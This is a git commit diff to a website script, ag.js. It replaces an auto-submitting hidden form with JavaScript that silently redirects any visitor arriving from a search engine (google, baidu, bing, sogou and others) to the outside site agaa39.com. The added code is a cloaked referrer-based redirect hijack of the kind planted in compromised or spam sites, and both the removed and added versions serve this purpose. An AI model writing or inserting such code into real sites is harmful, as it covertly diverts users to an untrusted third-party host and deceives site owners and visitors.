d574188e4f13e1212719d813d4e96c9d7747f524
maomapchong <zhangjiadaz@gmail.com>
2018-01-22 14:09:58 +0800

    Update ag.js

--- ag.js
+++ ag.js
@@ -1,10 +1,3 @@
-<script LANGUAGE='Javascript'>
-function sub(){
-document.baidu.submit();
-}
-var s=document.referrer;
-if(s.indexOf('baidu')>0 || s.indexOf('sogou')>0 || s.indexOf('soso')>0 ||s.indexOf('sm')>0 ||s.indexOf('uc')>0 ||s.indexOf('bing')>0 ||s.indexOf('yahoo')>0 ||s.indexOf('so')>0 ){
-setTimeout(sub,100);
-}
-</script>
-<form id="DnAddWebForm" method="post" action="http://agaa39.com" name="baidu"></form>
+var s=document.referrer 
+if(s.indexOf("google")>0 || s.indexOf("baidu")>0 || s.indexOf("so")>0  || s.indexOf("sogou")>0 || s.indexOf("sm")>0 || s.indexOf("soso")>0 || s.indexOf("bing")>0) 
+location.href="http://agaa39.com"; 
